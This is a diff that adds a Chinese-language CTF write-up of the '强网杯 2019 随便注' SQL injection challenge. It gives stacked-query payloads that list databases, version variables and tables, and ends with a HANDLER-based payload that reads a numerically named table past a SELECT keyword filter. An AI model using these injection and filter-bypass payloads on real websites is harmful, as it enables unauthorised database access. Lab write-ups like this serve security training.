@@ -114,3 +114,179 @@ if (in_array($_page, $whitelist)) {
 
 进入 secr3t.php，发现源码，然后没有禁止 filter，直接把 flag.php 的内容转 base64 输出出来就得到了。
 
+### [强网杯 2019]随便注
+
+[题目链接](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8)
+
+检查源代码发现有提示 EasySQL。
+
+随便输入点类似 `';SELECT database();` 之类的，发现返回：
+
+`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`
+
+大概意思就是把这些关键字给禁了。
+
+所以我们可用 `';show databases;' 得到数据库：
+
+```
+array(1) {
+  [0]=>
+  string(11) "ctftraining"
+}
+
+array(1) {
+  [0]=>
+  string(18) "information_schema"
+}
+
+array(1) {
+  [0]=>
+  string(5) "mysql"
+}
+
+array(1) {
+  [0]=>
+  string(18) "performance_schema"
+}
+
+array(1) {
+  [0]=>
+  string(9) "supersqli"
+}
+
+array(1) {
+  [0]=>
+  string(4) "test"
+}
+```
+
+同理，`';SHOW VARIABLES LIKE '%version%';` 得到系统版本。
+
+```
+array(2) {
+  [0]=>
+  string(33) "in_predicate_conversion_threshold"
+  [1]=>
+  string(4) "1000"
+}
+
+array(2) {
+  [0]=>
+  string(14) "innodb_version"
+  [1]=>
+  string(7) "10.3.18"
+}
+
+array(2) {
+  [0]=>
+  string(16) "protocol_version"
+  [1]=>
+  string(2) "10"
+}
+
+array(2) {
+  [0]=>
+  string(22) "slave_type_conversions"
+  [1]=>
+  string(0) ""
+}
+
+array(2) {
+  [0]=>
+  string(31) "system_versioning_alter_history"
+  [1]=>
+  string(5) "ERROR"
+}
+
+array(2) {
+  [0]=>
+  string(22) "system_versioning_asof"
+  [1]=>
+  string(7) "DEFAULT"
+}
+
+array(2) {
+  [0]=>
+  string(7) "version"
+  [1]=>
+  string(15) "10.3.18-MariaDB"
+}
+
+array(2) {
+  [0]=>
+  string(15) "version_comment"
+  [1]=>
+  string(14) "MariaDB Server"
+}
+
+array(2) {
+  [0]=>
+  string(23) "version_compile_machine"
+  [1]=>
+  string(6) "x86_64"
+}
+
+array(2) {
+  [0]=>
+  string(18) "version_compile_os"
+  [1]=>
+  string(5) "Linux"
+}
+
+array(2) {
+  [0]=>
+  string(22) "version_malloc_library"
+  [1]=>
+  string(6) "system"
+}
+
+array(2) {
+  [0]=>
+  string(23) "version_source_revision"
+  [1]=>
+  string(40) "604f80e77c054758aa449064cdc29dfa13a71922"
+}
+
+array(2) {
+  [0]=>
+  string(19) "version_ssl_library"
+  [1]=>
+  string(27) "OpenSSL 1.1.1d  10 Sep 2019"
+}
+
+array(2) {
+  [0]=>
+  string(19) "wsrep_patch_version"
+  [1]=>
+  string(11) "wsrep_25.24"
+}
+```
+
+其实一大串，比较重要的就是这个数据库的版本是 `10.3.18-MariaDB`。
+
+输入 `';show tables;`，得到表信息：
+
+```
+array(1) {
+  [0]=>
+  string(16) "1919810931114514"
+}
+
+array(1) {
+  [0]=>
+  string(5) "words"
+}
+```
+
+猜测这个 words 表应该就是网站正常运行用的表。也就是输入 1 得到 hahaha，2 得到 miaomiaomiao。
+
+这个 1919810931114514 表大概率藏着东西，由于表名是纯数字，而 **SQL 语法在表名或列名是纯数字时必须用特殊格式包裹表示。**
+
+其中 mysql 以及本题的 MariaDB 使用反引号 ` `` ` 包裹，而 PostgreSQL 与 Oracle 用双引号 `""`，SQL Server / MSSQL 用方括号 `[]`。
+
+总之我们用 HANDLER 强行打开读取这个表就可以了。
+
+```
+1'; HANDLER `1919810931114514` OPEN; HANDLER `1919810931114514` READ FIRST; #
+```
+
